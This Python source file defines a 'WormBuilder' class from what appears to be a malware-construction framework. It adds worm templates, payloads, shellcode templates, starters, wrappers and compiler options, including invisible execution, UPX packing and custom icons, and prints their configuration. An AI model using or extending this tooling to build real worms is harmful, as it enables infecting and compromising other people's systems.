
from typing import Union

from app.hive.Lib.tools.worm_var import WormVar
from app.tools.text_formater import Texter, Texter4C
from .items.default_var import Default
from .items.food import Food
from .items.icons import Icons




class WormBuilder:
    def __init__(self, queen: object, name: str = "MyWorm"):
        self.queen = queen
        self.dir_icons = self.queen.Lib.dir_icons
        self.msg = self.queen.msg
        self.raw_worm = WormConfig(self)
        self.defVar = Default(self.queen.conf)
        self.FOOD = Food(self.queen.Lib)
        self.name = name
        self.icon = None
        self.get_item = self.queen.Lib.get_item
        self.cscr = self.queen.conf.console_screen
        self.prepare_screen()
        # self.texter_3c = Texter(25,30,120, add_end_line=True)
        # self.texter = Texter(25, 130, add_end_line=True)
        # self.texter_4c = Texter4C(25,25,30,100,add_new_line=True)
        self.shadow_mod_tag = "_"
        self.icons = Icons(self, self.queen)
        

    
    def prepare_screen(self) -> None:
        c2 = self.cscr["2c"]
        c3 = self.cscr["3c"]
        c4 = self.cscr["4c"]
        self.texter = Texter(c2[0], c2[1], add_end_line=True)
        self.texter_3c = Texter(c3[0], c3[1], c3[2], add_end_line=True)
        self.texter_4c = Texter4C(c4[0], c4[1], c4[2], c4[3], add_new_line=True)

    
    @property
    def var(self) -> dict:
        return self.raw_worm.var
    
    @property
    def globalVar(self) -> dict:
        return self.raw_worm.globalVar
    
    @property
    def modules_name(self) -> list:
        mods = []
        for mod in self.raw_worm.modules.keys():
            mods.append(mod)
        return mods
    
    @property
    def items(self) -> list:
        return self.raw_worm.all_modules
    
    @property
    def code_loaders(self) -> list:
        load = []
        for mod in self.raw_worm.modules.values():
            if mod.subTypes == "mod_loader":
                load.append(mod)
        return load
    
    @property
    def lang(self) -> str:
        if not self.raw_worm.master_worm:
            return "<UNKNOWN>"
        if not self.raw_worm.master_worm.lang:
            return "py"
        else:
            return self.raw_worm.master_worm.lang
    
    @property
    def pipe_process(self) -> list:
        return self.raw_worm.process.sheme
    
    def set_name(self, name: str) -> None:
        self.name = name
        self.msg("msg", f"Set new name for worm: '{name}'")
    
    def set_compiler(self, compiler_name: str) -> None:
        worm_comp = self.raw_worm.globalVar.get("COMPILER_NAME")
        if not worm_comp:
            self.raw_worm._globalVar["COMPILER_NAME"] = compiler_name
            self.msg("msg", f"Set compiler: '{compiler_name}' successful")
        else:
            self.msg("error", f"You can't change compiler")

    def set_icon(self, name: str) -> None:
        icon = self.icons.set_icon(name)
        if not icon:
            self.msg("error", f"ERROR: File '{name}' does not exists in icons directory.")
        else:
            self.icon = icon
            self.msg("msg", f"Set new icon for worm executables: '{name}'.")
    
        
    
    def Add(self, types: str, mod_name: str, target: str = None) -> None:
        mod = self.queen.Lib.get_item(types, mod_name)
        if not mod:
            return
        self.add(mod, target)
    
    def add(self, item: object, target: str = None) -> None:
        if not self.raw_worm.master_worm and item.types != "worm":
            self.msg("error", "[!!] ERROR: First you need add worm [!!]")
            return
        if item.types in self.raw_worm.banned:
            self.msg("error", "[!!] You cannot add this element, the worm will not handle it [!!]")
            return
        match item.types:
            case "worm":
                self.add_worm(item)
            case "module":
                self.add_module(item)
            case "payload":
                self.add_payload(item, target)
            case "starter":
                self.add_starter(item)
            case "shadow":
                self.add_shadow(item)
            case "wrapper":
                self.add_wrapper(item)
            case "process":
                self.add_process(item)
            case "cscript":
                self.add_compiler_script(item)
            case "scode":
                self.add_shellcode_temp(item)
        
        self.check_depediences()
    
    def add_shellcode_temp(self, item: object) -> None:     
        if self.raw_worm.master_worm.extBuild != "WinShell":
            self.msg("error", "[!!] ERROR: Shellcode template can only be added to a special worm. [!!]")
            self.msg("error", "[!!] Choose a worm to build shellcodes. [!!]")
            return
        if not self.raw_worm.scode:
            resp = f"Add shellcode template: '{item.name}' successfull"
        else:
            resp = f"Replace shellcode template from '{self.raw_worm.scode.name}' to '{item.name}' successfull"
        self.raw_worm.scode = item
        self.msg("msg", resp)


    def add_support_file(self, item: object, target: str) -> None:
        if target in self.raw_worm.sfiles.keys():
            return
        self.raw_worm.sfiles[target] = item
        self.msg("msg", f"Add support file: {item.name} successfull")
        self.check_depediences()
        

            
    def add_compiler_script(self, item: object) -> None:
        wcomp = self.raw_worm.globalVar.get("COMPILER")
        if not wcomp:
            self.msg("error", "[!!] ERROR: Compiler not set. First, select a compiler for the worm. [!!]")
            return
        if not wcomp in item.compiler_compatibility:
            self.msg("error", f"[!!] ERROR: This script is not compatible with this compiler: '{wcomp}' [!!]")
            return
        # if item.compiler_compatibility != wcomp:
        #     self.msg("error", f"[!!] ERROR: This script is not compatible with this compiler: '{wcomp}' [!!]")
        #     return
        self.raw_worm.cscript = item
        self.msg("msg", f"Add compiler script: '{item.name}' successfull.")

                
    
    def add_worm(self, item: object) -> None:
        if self.raw_worm.master_worm:
            self.msg("error", "[!!] You can't add a main template to an existing worm. Use the 'rebuild' command. [!!]")
            return
        if not item.processWorm:
            proc = self.get_item("process", "TinyProcess")
        else:
            proc = self.get_item("process", item.processWorm)
        self.raw_worm.master_worm = item
        self.msg("msg", f"Set Master Template: {item.name}")
        self.add_process(proc)
        
    
    def add_module(self, item: object) -> bool:
        if item.name in self.raw_worm.modules.keys():
            self.msg("error", "This module has already been added")
            return False
        else:
            if len(self.raw_worm.accepted_modules) == 0 or "all" in self.raw_worm.accepted_modules:
                self.raw_worm.modules[item.name] = item
                self.msg("msg", f"Add new module: '{item.name}' successful")
                return True
            else:
                if not item.subTypes in self.raw_worm.accepted_modules:
                    self.msg("error", f"[!!] This worm does not support this type of modules [!!]")
                    return False
                else:
                    self.raw_worm.modules[item.name] = item
                    self.msg("msg", f"Add new module: '{item.name}' successful")
                    return True
            # self.raw_worm.modules[item.name] = item
            # self.msg("msg", f"Add new module: '{item.name}' successful")
            # return True

    def add_support(self, item: object) -> bool:
        if item.name in self.raw_worm.support.keys():
            self.msg("error", "Support module has already been added")
            return False
        else:
            self.raw_worm.support[item.name] = item
            self.msg("msg", f"Add support module: '{item.name}' successful")
            return True
    
    def add_payload(self, item: object, target_var: str = None) -> None:
        if len(self.raw_worm.reqPayload) < 1:
            self.msg("error", "ERROR: You don't have room to add a payload")
            return
        if target_var:
            target = self.raw_worm.reqPayload.get(target_var)
            if not target:
                self.msg("error", f"ERROR: place for payload: '{target_var}' does not exists.")
                return
            item.options.update(target.options)
            item.options["PAYLOAD_TARGET_VAR"] = target_var
            item.owner = target.owner
            self.raw_worm.payloads[target_var] = item
            self.msg("msg", f"Add payload: '{item.name}' to '{target_var}' successful.")
        else:
            for name, rp in self.raw_worm.reqPayload.items():
                item.options.update(rp.options)
                ###update owner
                item.owner = rp.owner
                self.raw_worm.payloads[name] = item
                self.msg("msg", f"Add payload: '{item.name}' successful.")
                return

    def add_starter(self, item: object) -> None:
        if self.raw_worm.starter:
            self.msg("msg", f"Replace starter from '{self.raw_worm.starter.name}' to '{item.name}'")
            self.raw_worm.starter = item
        else:
            self.raw_worm.starter = item
            self.msg("msg", f"Add starter: '{item.name}' successfull")

    def add_shadow(self, item: object) -> None:
        name = item.name
        if name in self.raw_worm.shadow.keys():
            while name in self.raw_worm.shadow.keys():
                name += self.shadow_mod_tag
            self.raw_worm.shadow[name] = item
        else:
            self.raw_worm.shadow[name] = item
        self.msg("msg", f"Add Shadow '{item.name}' successfull. Tag name: '{name}'")
    
    def add_wrapper(self, item: object) -> None:
        if self.raw_worm.wrapper:
            self.msg("msg", f"Replace wrapper from '{self.raw_worm.wrapper.name}' to '{item.name}'")
        else:
            self.msg("msg", f"Set wrapper: '{item.name}' successfull")
        self.raw_worm.wrapper = item
        ### replace ProcessWorm
        if item.processWorm:
            pWorm = self.get_item("process", item.processWorm)
            if not pWorm:
                self.msg("error", f"ERROR: No process worm item: '{item.processWorm}'")
                return
            self.raw_worm.process = pWorm
            self.msg("msg", "Update Process Worm")
    
    def add_variable(self, name: str, value: any, types: str = None, var_info: str = None) -> None:
        var = self.raw_worm.var.get(name)
        if not var:
            var = self.raw_worm.reqVar.get(name)
        if not var:
            var = self.raw_worm.garbageVar.get(name)
        if not var:
            self.msg("error", f"ERROR: Variable '{name}' does not exists")
            return
        var.set_value(value)
        if var_info:
            var.info = var_info
        self.msg("msg", f"Add variable: '{name}' successful")
    
    def add_food(self, name: str) -> None:
        rf = self.raw_worm.reqFood.get(name)
        if not rf:
            self.msg("error", f"[!!] ERROR: Missing food variable: '{name}' [!!]")
            return
        food = self.FOOD.eat(rf)
        if not food:
            self.msg("error", f"[!!] ERROR: Missing food: '{rf.name}' [!!]")
            return
        self.raw_worm.food[name] = food
        self.msg("msg", "Update foods variables.")
    
    def add_food_as_var(self, src_var_name: str, dest_var_name: str) -> None:
        food = self.get_item("food", src_var_name)
        if not food:
            return
        self.add_variable(dest_var_name, str(food.value), var_info=food.info)
    
    def add_globalVar(self, name: str, value: str) -> None:
        if value in ["None", "False"]:
            value = None
        self.raw_worm._globalVar[name] = value
        self.msg("msg", f"Set global variable: '{name}' to '{str(value)}'.")


    
    def add_process(self, item: object) -> None:
        self.raw_worm.process = item
        self.msg("msg", f"Set process: {item.name}")


        
    
    def get_worm_item(self, item_name: str) -> Union[None, object]:
        for item in self.raw_worm.all_modules:
            if item.name == item_name:
                return item
        return None
    
    def remove_payload(self, module_name: str) -> None:
        too_del = None
        for name, mod in self.raw_worm.payloads.items():
            if mod.name == module_name:
                too_del = name
        if too_del:
            del self.raw_worm.payloads[too_del]
            self.msg("msg", f"Remove payload: '{module_name}' successful.")
        else:
            self.msg("error", f"ERROR: Not payload: '{module_name}'.")

    
    def remove(self, types: str, mod_name: str) -> None:
        if types == "worm":
            self.msg("error", "[!!] ERROR: You cannot delete the main module. Use the command to clean the entire worm. [!!]")
            return
        if types == "support":
            self.msg("error", "[!!] ERROR: You cannot remove this module, it is added automatically. [!!]")
            return
        clear = self.get_worm_item(mod_name)
        if not clear:
            self.msg("error", f"[!!] ERROR: '{mod_name}' does not exists in worm [!!]")
            return
        match clear.types:
            case "module":
                del self.raw_worm.modules[mod_name]
            case "payload":
                self.remove_payload(mod_name)
                return
            case "shadow":
                del self.raw_worm.shadow[mod_name]
            case "junk":
                del self.raw_worm.junks[mod_name]
            case "starter":
                self.raw_worm.starter = None
            case "wrapper":
                self.raw_worm.wrapper = None
            case "cscript":
                self.raw_worm.cscript = None

        self.msg("msg", f"Remove: '{mod_name}' successful.")
        self.check_depediences()

        
    
    def check_depediences(self) -> None:
        self.msg("msg", "Check depediences...")

        for name in self.raw_worm.reqSMod:
            if name in self.raw_worm.support.keys():
                continue
            rsm = self.get_item("support", name, True)
            if not rsm:
                rsm = self.get_item("module", name, True)
            
            if not rsm:
                self.msg("error", f"[!!] ERROR: Module: '{name}' is missing. [!!]")
                continue
            out = self.add_support(rsm)
            if out:
                self.check_depediences()
        
        for name in self.raw_worm.reqMod:
            if name in self.raw_worm.modules.keys():
                continue
            rm = self.get_item("module", name, True)
            if not rm:
                self.msg("error", f"[!!] ERROR: Module: '{name}' is missing [!!]")
                continue
            out = self.add_module(rm)
            if out:
                self.check_depediences()
        

        for name, rv in self.raw_worm.reqVar.items():
            if name in self.raw_worm.var.keys():
                continue
            if name in self.defVar.var:
                rv.set_value(self.defVar.var[name])
        for name, rf in self.raw_worm.reqFood.items():
            # if name in self.raw_worm.food.keys():
            #     continue
            self.add_food(name)
        for name, sv in self.raw_worm.setVar.items():
            self.raw_worm._var[name] = sv
        self.raw_worm.check_garbageVar()

        # check required compiler script
        for m in self.raw_worm.all_modules:
            if m.reqCS:
                if self.raw_worm.cscript:
                    if m.reqCS != self.raw_worm.cscript.name:
                        self.Add("cscript", m.reqCS)
                else:
                    self.Add("cscript", m.reqCS)
        
        # check for support files (sfile module)
        for item in self.items:
            for name, target in item.include.items():
                sf = self.get_item("sfiles", name)
                if not sf:
                    self.msg("error", f"[!!] ERROR: No support file: '{name}' [!!]")
                else:
                    self.add_support_file(sf, target)
        
                    
        
        
        
        

    ######################### SHOW WORM #######################

    
    def title(self, name: str) -> str:
        label_len = self.cscr["slen"]
        name_len = len(name) + 2
        label_part = int((label_len - name_len) / 2)
        label = "\n" + "#" * label_part + f" {name} " + "#" * label_part + "\n"
        
        return label
    
    def show_worm(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not self.raw_worm.master_worm:
            return ""
        banned = self.raw_worm.master_worm.banned
        text = self.title("Worm Info:")
        text += self.texter.make_2column("--- Worm Name:", self.name) 
        text += self.texter.make_2column("--- Master Worm:", self.raw_worm.master_worm.name)
        text += self.texter.make_2column("--- Master Info:", self.raw_worm.master_worm.info)
        text += self.texter.make_2column("--- Tags: ", self.raw_worm.master_worm.system_FLAG)
        if banned:
            text += self.texter.make_2column("--- Banned:", ", ".join(banned))
        if len(self.raw_worm.accepted_modules) > 0:
            acm = ""
            for am in self.raw_worm.accepted_modules:
                if am == "dll":
                    acm += "[DLL_modules] "
                else:
                    acm += f"[{am}] "
            text += self.texter.make_2column("--- Accepted Modules:", acm)
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_worm2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not self.raw_worm.master_worm:
            return {}
        banned = self.raw_worm.master_worm.banned
        wi = {}
        wi["data"] = [
            ["Worm Name:", self.name],
            ["Master Worm:", self.raw_worm.master_worm.name],
            ["Master Info", self.raw_worm.master_worm.info],
            ["Tags:", self.raw_worm.master_worm.system_FLAG]
        ]
        if banned:
            wi["data"].append(["Banned:", ", ".join(banned)])

        if len(self.raw_worm.accepted_modules) > 0:
            acm = ""
            for am in self.raw_worm.accepted_modules:
                if am == "dll":
                    acm += "[DLL_modules] "
                else:
                    acm += f"[{am}] "
            wi["data"].append(["Accepted Modules:"], acm)
        comp = self.raw_worm.globalVar.get("COMPILER")
        if not comp:
            comp = "<Compiler not set>"
        wi["data"].append(["Compiler:", comp])
        width = list(self.cscr["2c"])
        # wi["headers"] = ["-" * width[0], " ----------------------- WORM INFO ----------------------------"]
        wi["width"] = width
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi

    
    def show_modules(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not empty_show:
            if len(self.raw_worm.modules) < 1 and len(self.raw_worm.support) < 1:
                return ""
        text = self.title("Modules:")
        for name, mod in self.raw_worm.modules.items():
            mname = f"-- [{name}]{mod.system_FLAG}{mod.tags}"
            text += self.texter.make_2column(mname, mod.info, width1=35, width2=80)
        for name, smod in self.raw_worm.support.items():
            sname = f"-- [{name}][S]{smod.system_FLAG}{smod.tags}"
            text += self.texter.make_2column(sname, smod.info, width1=35, width2=80)
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_modules2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not empty_show:
            if len(self.raw_worm.modules) < 1 and len(self.raw_worm.support) < 1:
                return {}
        wi = {}
        wi["headers"] = ["MODULE NAME:", "MODULE DESCRIPTION:"]
        wi["data"] = []
        for name, mod in self.raw_worm.modules.items():
            wi["data"].append([f"{name}{mod.system_FLAG}{mod.tags}", mod.info])
        for name, mod in self.raw_worm.support.items():
            wi["data"].append([f"{name}[S]{mod.system_FLAG}{mod.tags}", mod.info])
        wi["width"] = list(self.cscr["2c"])
        # wi["color"] = "white"
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi

    def show_reqPayloads(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not empty_show and len(self.raw_worm.reqPayload) < 1:
            return ""
        text = self.title("Required Payloads:")
        for name, rp in self.raw_worm.reqPayload.items():
            text += self.texter.make_2column(f"-- {name}", str(rp.info))
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_reqPayloads2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not empty_show and len(self.raw_worm.reqPayload) < 1:
            return {}
        wi = {}
        width = list(self.cscr["2c"])

        wi["headers"] = ["REQUIRED PAYLOADS:", f"DESCRIPTION:{' ' * (width[1] - 15)}"]
        wi["data"] = []
        for name, rp in self.raw_worm.reqPayload.items():
            wi["data"].append([name, str(rp.info)])
        wi["width"] = list(self.cscr["2c"])
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi
        
    def show_payloads(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not empty_show and len(self.raw_worm.payloads) < 1:
            return ""
        text = self.title("Payloads:")
        for name, pay in self.raw_worm.payloads.items():
            text += self.texter.make_2column(f"-- {name}", str(pay.info))
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_payloads2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not empty_show and len(self.raw_worm.payloads) < 1:
            return {}
        wi = {}
        wi["headers"] = ["PAYLOAD NAME:", "PAYLOAD DESCRIPTION:"]
        wi["data"] = []
        for name, pay in self.raw_worm.payloads.items():
            wi["data"].append([pay.name, str(pay.info)])
        wi["width"] = list(self.cscr["2c"])
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi


    def show_var(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not empty_show and len(self.raw_worm.var) < 1:
            return ""
        text = self.title("Variables")
        for name, var in self.raw_worm.var.items():

            text += self.texter_4c.make_4column(f"# {name}", f"[{var.owner}]", var.show(), str(var.info))
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_var2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not empty_show and len(self.raw_worm.var) < 1:
            return {}
        wi = {}
        wi["headers"] = ["VARIABLE NAME:", "OWNER:", "VALUE:", "DESCRIPTION:"]
        wi["data"] = []
        for name, var in self.raw_worm.var.items():
            val = f" {var.show()} "
            wi["data"].append([name, f"[{var.owner}]", val, str(var.info)])
        wi["width"] = list(self.cscr["4c"])
        # wi["color"] = "white"
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi
    
    def show_reqVar(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not empty_show and len(self.raw_worm.reqVar) < 1:
            return ""
        text = self.title("Required Variables")
        text += self.texter_3c.make_3column("# Name:", "Owner:", "Description:")
        for name, rv in self.raw_worm.reqVar.items():
            text += self.texter_3c.make_3column(f"# {name}", str(rv.owner), str(rv.info))
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_reqVar2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not empty_show and len(self.raw_worm.reqVar) < 1:
            return {}
        wi = {}
        wi["headers"] = ["REQUIRED VARIABLE:", "OWNER:", "DESCRIPTION:"]
        wi["data"] = []
        for name, rv in self.raw_worm.reqVar.items():
            wi["data"].append([name, f"[{str(rv.owner)}]", str(rv.info)])
        wi["width"] = list(self.cscr["3c"])
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi

    def show_reqFood(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not empty_show and len(self.raw_worm.reqFood) < 1:
            return ""
        text = self.title("Required Foods")
        for name, rf in self.raw_worm.reqFood.items():
            text += self.texter_3c.make_3column(name, rf.show(), str(rf.info))
        if display:
            self.msg("msg", text)
        else:
            return text

    def show_reqFood2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not empty_show and len(self.raw_worm.reqFood) < 1:
            return {}
        wi = {}
        wi["headers"] = ["REQUIRED FOOD:", "VALUE:", "DESCRIPTION:"]
        wi["data"] = []
        for name, rf in self.raw_worm.reqFood.items():
            wi["data"].append([name, f" {rf.show()} ", str(rf.info)])
        # wi["color"] = "green"
        wi["width"] = list(self.cscr["3c"])
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi
    
    def show_shadow(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not empty_show and len(self.raw_worm.shadow) < 1:
            return ""
        text = self.title("Shadows:")
        for name, sh in self.raw_worm.shadow.items():
            text += self.texter.make_2column(f"-- [{name}]", str(sh.info))
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_shadow2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not empty_show and len(self.raw_worm.shadow) < 1:
            return {}
        wi = {}
        wi["headers"] = ["SHADOW NAME:", "DESCRIPTION:"]
        wi["data"] = []
        for name, sh in self.raw_worm.shadow.items():
            wi["data"].append([name, str(sh.info)])
        wi["width"] = list(self.cscr["2c"])
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi
    
    def show_starter(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not empty_show and not self.raw_worm.starter:
            return ""
        text = self.title("Starter:")
        text += self.texter.make_2column(f"-- [{self.raw_worm.starter.name}]", str(self.raw_worm.starter.info))
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_starter2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not empty_show and not self.raw_worm.starter:
            return {}
        wi = {}
        wi["headers"] = ["STARTER NAME:", "DESCRIPTION:"]
        wi["data"] = [[self.raw_worm.starter.name, str(self.raw_worm.starter.info)]]
        wi["width"] = list(self.cscr["2c"])
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi

    def show_wrapper(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not empty_show and not self.raw_worm.wrapper:
            return ""
        text = self.title("Wrapper:")
        text += self.texter.make_2column(f"-- [{self.raw_worm.wrapper.name}]", str(self.raw_worm.wrapper.info))
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_wrapper2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not empty_show and not self.raw_worm.wrapper:
            return {}
        wi = {}
        wi["headers"] = ["WRAPPER NAME:", "DESCRIPTION:"]
        wi["data"] = [[self.raw_worm.wrapper.name, str(self.raw_worm.wrapper.info)]]
        wi["width"] = list(self.cscr["2c"])
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi

    def show_garbageVar(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not empty_show and len(self.raw_worm.garbageVar) < 1:
            return ""
        text = self.title("Garbage Variables:")
        for gv in self.raw_worm.garbageVar.values():
            text += self.texter_3c.make_3column(f"# {gv.name}", str(gv.value), str(gv.info))
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_garbageVar2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not empty_show and len(self.raw_worm.garbageVar) < 1:
            return {}
        wi = {}
        wi["headers"] = ["GARBAGE VARIABLE:", "VALUE:", "DESCRIPTION:"]
        wi["data"] = []
        for gv in self.raw_worm.garbageVar.values():
            wi["data"].append([gv.name, f" {str(gv.value)} ", str(gv.info)])
        wi["width"] = list(self.cscr["3c"])
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi
    
    def show_process(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        if not empty_show and not self.raw_worm.process:
            return ""
        text = self.title("Process Worm:")
        proc = f"[{self.raw_worm.process.sheme[0]}]"
        for s in self.raw_worm.process.sheme[1:]:
            proc += f" ---> [{s}]"
        text += self.texter.make_2column(self.raw_worm.process.name, proc)
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_process2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not empty_show and not self.raw_worm.process:
            return {}
        wi = {}
        wi["headers"] = ["PROCESS NAME:", "PROCESS BUILD STEP:"]
        proc = f"[{self.raw_worm.process.sheme[0]}]"
        for s in self.raw_worm.process.sheme[1:]:
            proc += f" ---> [{s}]"
        wi["data"] = [[self.raw_worm.process.name, proc]]
        wi["width"] = list(self.cscr["2c"])
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi
    
    def show_compiler(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        comp = self.raw_worm.globalVar.get("COMPILER")
        text = self.title("Compiler:")
        if not comp:
            text += "# Compiler not set. Default will be used."
        else:
            text += f"# {comp}"
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_compiler2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        comp = self.raw_worm.globalVar.get("COMPILER")
        wi = {}
        #wi["headers"] = ["COMPILER:", comp]
        wi["data"] = [["COMPILER:", comp]]
        wi["width"] = list(self.cscr["2c"])
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi
    
    def show_scode_temp2(self, display: bool = False, empty_show: bool = False) -> Union[dict, None]:
        if not self.raw_worm.scode:
            return {}
        wi = {}
        wi["headers"] = ["TEMPLATE NAME:", "NULL Bytes:", "SHELLCODE DESCRIPTION:"]
        wi["data"] = [[self.raw_worm.scode.name, "yes" if self.raw_worm.scode.NullBytes else "no", self.raw_worm.scode.info]]
        wi["width"] = list(self.cscr["3c"])
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi

    def show_help(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        text = self.title("Description:")
        text += "--- [S] - Support Module. Added automatically by the worm. --- \n"
        text += "--- [LW] - Works on windows and linux ---\n"
        text += "--- [L] - Works only on linux ---\n"
        text += "--- [W] - Works only on windows\n"
        text += "--- [CS] - Variable tag. File variable 'res' ('rc'). 'Compiler Script' variables do not affect the worm's operation, they are information of the ready executable file.\n"
        text += "--- [PyS] - Python script. Uses standard libraries.\n"
        text += "--- [PyEx] - Python script. Uses additional PIP libraries.\n"
        text += "--- [PS] - Powershell script\n"
        text += "--- [SCode] - Shellcode"
        if display:
            self.msg("msg", text)
        else:
            return text
    
    def show_global_var(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
        text = self.title("Global Variables:")
        texter = Texter(35, 110, add_end_line=True)
        text += texter.make_2column("Name:", "Description:")
        text += texter.make_2column("-- NO_COMPILE --", "Skips the worm compilation step. May lead to problems if further 'process' steps involve working with executable files.")
        text += texter.make_2column("-- USE_UPX --", "Uses compression by default when creating each executable.")
        text += texter.make_2column("-- COMPILER --", "The name of the compiler used for compilation.")
        text += texter.make_2column("-- PROGRAM_TYPE --", "How the executable file is to be run. 'console' - the program is run in the console (useful for testing). 'window' - the program is run invisibly without the console.")
        text += texter.make_2column("-- NO_DLL --", "It does not include additional DLL libraries in the executable file. It reduces the size of the worm. Most worms use the 'win32api' function so if they are run on windows there is no need to add these libraries there. It works with C and Assembler code.")
        # text += texter.make_2column("-- PRE_COMPILER --", "Using a special build script that allows for more interference in the build process. Available only for PyInstaller. Use the 'WinePyInst' compiler.")
        # text += texter.make_2column("-- PYINSTALLER_EXCLUDE_MODS -- ", "An additional script option that will try not to include unused python libraries in the executable. It may reduce the size of the worm. NOTE: This feature is experimental and may give different results.")
        text += self.title("Set by You:")
        if len(self.raw_worm._globalVar) < 1:
            text += "---------- No Variables -----------------\n"
        else:
            for n, v in self.raw_worm._globalVar.items():
                text += texter.make_2column(f"-- {n} --", str(v))
        text += self.title("From worm:")
        text += "---- WARNING: These are options that are imposed by the worm and modules. Only change them if you know what you are doing. ----\n"
        text += self.texter_3c.make_3column("Name:", "Value:", "Description:")
        for gv in self.raw_worm.globalVarWorm:
            text += self.texter_3c.make_3column(gv[0], gv[1], gv[2])
        if display:
            self.msg("msg", text)
        else:
            return text

    def show_all2(self, display: bool = True) -> Union[str, list]:
        if not self.raw_worm.master_worm:
            self.msg("error", "[!!] Worm is empty. First add a worm to template [!!]")
            return
        wi = []
        wi.append("\n" + "*" * 40 + " - - WORM INFO - - " + "*" * 40 + "\n")
        wi.append(self.show_help())
        wi.append(self.show_worm2())
        wi.append(self.show_modules2())
        wi.append(self.show_reqPayloads2())
        wi.append(self.show_payloads2())
        wi.append(self.show_var2())
        wi.append(self.show_garbageVar2())
        wi.append(self.show_reqVar2())
        wi.append(self.show_reqFood2())
        wi.append(self.show_shadow2())
        wi.append(self.show_starter2())
        wi.append(self.show_wrapper2())
        wi.append(self.show_process2())
        wi.append(self.show_compiler2())
        wi.append(self.show_scode_temp2())
        
        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi
    
    def make_separator(self, name: str, char: str = "*") -> str:
        slen = self.cscr["slen"] - 8
        sep = slen - len(name)
        sep = int(sep / 2)
        return f"\n{char * sep} {name} {char * sep}\n"
    
    def show_all(self, display: bool = True) -> Union[list, None]:
        if not self.raw_worm.master_worm:
            self.msg("error", "[!!] Worm is empty. First add a worm to template [!!]")
            return
        wi = []
        # wi.append("\n" + "*" * 40 + " - - WORM INFO - - " + "*" * 40 + "\n")
        wi.append(self.show_help())
        wi.append(self.show_worm2())
        mod = self.show_modules2()
        if mod != {}:
            wi.append(self.make_separator("MODULES"))
            wi.append(mod)
        rp = self.show_reqPayloads2()
        if rp != {}:
            wi.append(self.make_separator("REQUIRED PAYLOAD"))
            wi.append(rp)
        pay = self.show_payloads2()
        if pay != {}:
            wi.append(self.make_separator("PAYLOADS"))
            wi.append(pay)
        var = self.show_var2()
        if var != {}:
            wi.append(self.make_separator("VARIABLES"))
            wi.append(var)
        gv = self.show_garbageVar2()
        if gv != {}:
            wi.append(self.make_separator("GARBAGE VARIABLES"))
            wi.append(gv)
        rv = self.show_reqVar2()
        if rv != {}:
            wi.append(self.make_separator("REQUIRED VARIABLES"))
            wi.append(rv)
        rf = self.show_reqFood2()
        if rf != {}:
            wi.append(self.make_separator("REQUIRED FOOD"))
            wi.append(rf)
        sh = self.show_shadow2()
        if sh != {}:
            wi.append(self.make_separator("SHADOW"))
            wi.append(sh)
        st = self.show_starter2()
        if sh != {}:
            wi.append(self.make_separator("STARTER"))
            wi.append(st)
        wr = self.show_wrapper2()
        if wr != {}:
            wi.append(self.make_separator("WRAPPER"))
            wi.append(wr)
        pr = self.show_process2()
        if pr != {}:
            wi.append(self.make_separator("PROCESS ITEM"))
            wi.append(pr)
        sc = self.show_scode_temp2()
        if sc != {}:
            wi.append(self.make_separator("SHELLCODE TEMPLATE"))
            wi.append(sc)
        
        wi.append(self.make_separator("*"))
        # cmp = self.show_compiler2()
        # if cmp != {}:
        #     wi.append(self.make_separator("COMPILER"))
        #     wi.append(cmp)
        

        if display:
            self.msg("msg", "", table=wi)
        else:
            return wi 

